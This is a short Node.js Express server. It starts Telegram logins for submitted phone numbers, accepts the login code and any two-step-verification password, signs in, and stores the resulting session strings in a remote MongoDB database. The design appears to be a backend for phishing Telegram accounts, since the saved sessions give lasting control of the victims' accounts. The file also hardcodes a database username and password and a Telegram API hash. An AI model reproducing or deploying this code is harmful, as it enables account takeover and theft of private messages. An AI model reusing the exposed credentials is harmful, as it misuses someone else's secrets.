const express = require('express');
const cors = require('cors');
const { TelegramClient, Api } = require('telegram');
const { StringSession } = require('telegram/sessions');
const mongoose = require('mongoose');

const app = express();
app.use(cors());
app.use(express.json());

const MONGODB_URI = "mongodb+srv://mercyinfo52_db_user:Hinva312!@cluster0.a0bslma.mongodb.net/?retryWrites=true&w=majority";

mongoose.connect(MONGODB_URI).then(() => console.log("DB connected"));

const sessionSchema = new mongoose.Schema({ phone: String, session: String });
const Session = mongoose.model('Session', sessionSchema);

let clientCache = {};

app.post('/send-otp', async (req, res) => {
    const { phone } = req.body;
    const client = new TelegramClient(new StringSession(''), 23049703, 'e9c00af578a9de0253ef02337460498f', { connectionRetries: 5 });
    await client.connect();
    const phoneCodeHash = await client.sendCode({ apiId: 23049703, apiHash: 'e9c00af578a9de0253ef02337460498f' }, phone);
    clientCache[phone] = { client, phoneCodeHash: phoneCodeHash.phoneCodeHash };
    res.json({ success: true });
});

app.post('/verify-otp', async (req, res) => {
    const { phone, code, password } = req.body;
    const cache = clientCache[phone];
    try {
        await cache.client.signIn({ apiId: 23049703, apiHash: 'e9c00af578a9de0253ef02337460498f', phoneNumber: phone, phoneCode: code, phoneCodeHash: cache.phoneCodeHash }, { password: password || undefined });
        const sessionString = cache.client.session.save();
        await Session.create({ phone, session: sessionString });
        res.json({ success: true });
    } catch (err) {
        if (err.errorMessage === 'SESSION_PASSWORD_NEEDED') return res.json({ success: false, require2FA: true });
        res.json({ success: false, error: err.message });
    }
});

app.listen(process.env.PORT || 3000);
